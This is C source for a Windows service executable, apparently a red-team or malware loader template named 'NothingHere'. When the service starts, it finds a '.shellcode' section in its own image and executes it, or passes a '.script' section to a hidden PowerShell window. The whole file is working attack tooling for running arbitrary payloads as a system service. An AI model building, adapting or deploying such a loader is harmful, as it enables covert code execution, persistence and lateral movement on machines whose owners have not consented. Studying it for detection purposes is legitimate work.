#include <stdbool.h>
#include <stdint.h>
#include <windows.h>
#include <winsvc.h>

SERVICE_STATUS          gSvcStatus; 
SERVICE_STATUS_HANDLE   gSvcStatusHandle; 

bool _strcmp(const char* restrict a, const char* restrict b) {
    while (*a != '\0' && *b != '\0'){
        if (*a++ != *b++) 
            break;
    }
    return *a == '\0' && *b == '\0';
}

VOID ReportSvcStatus( DWORD dwCurrentState,
                      DWORD dwWin32ExitCode,
                      DWORD dwWaitHint)
{
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;
    gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    gSvcStatus.dwCheckPoint = 0;
    SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
}


VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
{
   switch(dwCtrl) 
   {  
      case SERVICE_CONTROL_STOP: 
          ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
      default: 
          break;
   } 
}

VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
    // Register the handler function for the service

    gSvcStatusHandle = RegisterServiceCtrlHandlerA( 
        "NothingHere", 
        SvcCtrlHandler);

    if( !gSvcStatusHandle )
    { 
        return; 
    } 

    // These SERVICE_STATUS members remain as set here

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    gSvcStatus.dwServiceSpecificExitCode = 0;    

    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );

    // Run our shellcode/script
    uintptr_t pModAddr = (uintptr_t)GetModuleHandleA(NULL);
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)(pModAddr);
    IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pModAddr + pDosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* pSections = (IMAGE_SECTION_HEADER*)(pNTHeader + 1);

    for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) {
        if (_strcmp(pSections[i].Name, ".shellcode")) {
            ((void(*)())(pModAddr + pSections[i].VirtualAddress))(); // Execute shellcode
            break;
        }
        if (_strcmp(pSections[i].Name, ".script")) {
            ShellExecuteA(NULL, "open", "powershell.exe", (char*)(pModAddr + pSections[i].VirtualAddress), NULL, SW_HIDE); // Execute Powershell payload
            break;
        }
    }

    ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
}

void _start() {
    SERVICE_TABLE_ENTRY DispatchTable[] = 
    { 
        { "NothingHere", (LPSERVICE_MAIN_FUNCTION)SvcMain }, 
        { NULL, NULL } 
    }; 
 
    StartServiceCtrlDispatcher(DispatchTable);
    return;
}
